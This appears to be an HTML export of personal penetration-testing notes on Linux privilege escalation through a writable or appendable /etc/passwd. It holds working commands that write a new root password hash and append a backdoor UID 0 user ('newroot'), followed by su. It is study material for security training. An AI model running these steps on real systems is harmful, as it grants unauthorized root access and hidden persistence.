<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>/etc/passwd</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>/etc/passwd</h1><br/><a href="tem_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Where_are_stored_the_passwords_hashes_in_Linux.html">Where are stored the passwords hashes in Linux</a>: description of /etc/passwd and /etc/shadow<br /><br /><strong>/etc/passwd</strong><br />For backwards compatibility, if the second field of a user row in /etc/passwd contains a password hash, it takes precedent over the hash in /etc/shadow<br />• <strong><span style="color:#a020f0;">writable</span></strong> → enter a new password hash for the root user, and then use the su command to switch to the root user.<br />   0)  Check permissions<br />       <div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#from CIS</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">stat</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span></pre></div><br />       <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ .<span style="color:#ff9d00;font-weight:700">/</span>lse.sh -l 1             <span style="color:#0088ff;font-weight:400">#linux smart enumeration tool</span></pre></div><br />       <a href=""><img src="images/1293-1.png" alt="images/1293-1.png" /></a><br />       <a href=""><img src="images/1293-2.png" alt="images/1293-2.png" /></a><br />       <br />   1)generate an hash of a password we can use openssl. With <a href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--DES_algorithm.html">DES</a> or <a href="hodology--System_Security_(Windows_&_Linux)--Cryptography_and_Password_Cracking--Authentication--Linux--Hashing_algorithms--MD5_algorithm.html">MD5</a> algorithms(In <span style="color:#ff0000;">red</span> the Salt)<br />        <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ openssl <span style="color:#ff9d00;font-weight:700">passwd</span> <span style="color:#3ad900;font-weight:400">&quot;abc&quot;</span>   <span style="color:#0088ff;font-weight:400">#hash with DES algorithm</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ openssl <span style="color:#ff9d00;font-weight:700">passwd</span> <span style="color:#3ad900;font-weight:400">&quot;abc&quot;</span>   <span style="color:#0088ff;font-weight:400">#hash with MD5 algorithm</span></pre></div><br />       <a href=""><img src="images/1293-3.png" alt="images/1293-3.png" /></a><br />    2) Edit the /etc/passwd file and enter the hash in the second field of the root user<br />        <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ vim <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span><br /><span style="color:#0088ff;font-weight:400"># i --&gt; insert</span><br /><span style="color:#0088ff;font-weight:400">#Esc --&gt; esc from insert</span><br /><span style="color:#0088ff;font-weight:400">#:w --&gt; write(save)</span><br /><span style="color:#0088ff;font-weight:400">#:q --&gt; exit</span></pre></div><br />        <a href=""><img src="images/1293-4.png" alt="images/1293-4.png" /></a><br />    3) access to the root user<br />        <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">su</span></pre></div><br />        <a href=""><img src="images/1293-5.png" alt="images/1293-5.png" /></a><br />• <strong><span style="color:#ff8700;">appendable</span></strong> → create a new user but assign to it the root user ID (0). This works because Linux allows multiple entries for the same user ID, as long as the usernames are different<br />    0) If <span style="color:#a020f0;">writable</span> + <span style="color:#ff8700;">append</span> permission, mean that we can <span style="text-decoration:underline;">only</span> <span style="color:#ff8700;">append</span> lines to the file <br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">ls</span> -l <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span>     <span style="color:#0088ff;font-weight:400">#writable?</span><br />target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">lsattr</span> <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span>    <span style="color:#0088ff;font-weight:400">#appendable?</span></pre></div><br />    <a href=""><img src="images/1293-6.png" alt="images/1293-6.png" /></a><br />    <a href=""><img src="images/1293-7.png" alt="images/1293-7.png" /></a><br />    *To set and unset <span style="color:#ff8700;">append</span> mode to a file, root privileges are needed with the command &quot;chattr&quot;<br />    <div class="codebox"><pre>targetRoot@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">chattr</span> +a <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span>  <span style="color:#0088ff;font-weight:400">#set append</span><br />targetRoot@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">chattr</span> -a <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span>  <span style="color:#0088ff;font-weight:400">#unset append</span></pre></div><br />    1) append a new row to /etc/passwd to create an alternative root user <br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#3ad900;font-weight:400">&quot;newroot:LuFpseshVUYeU:0:0:root:/root:/bin/bash&quot;</span> &gt;&gt; <span style="color:#ff9d00;font-weight:700">/</span>etc<span style="color:#ff9d00;font-weight:700">/passwd</span></pre></div><br />    <a href=""><img src="images/1293-8.png" alt="images/1293-8.png" /></a><br />    2) access to the newroot user<br />    <div class="codebox"><pre>target@debian<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">su</span> - &lt;newUserCreated&gt;</pre></div><br />    <a href=""><img src="images/1293-9.png" alt="images/1293-9.png" /></a><br /><br /></div>
</body>
</html>
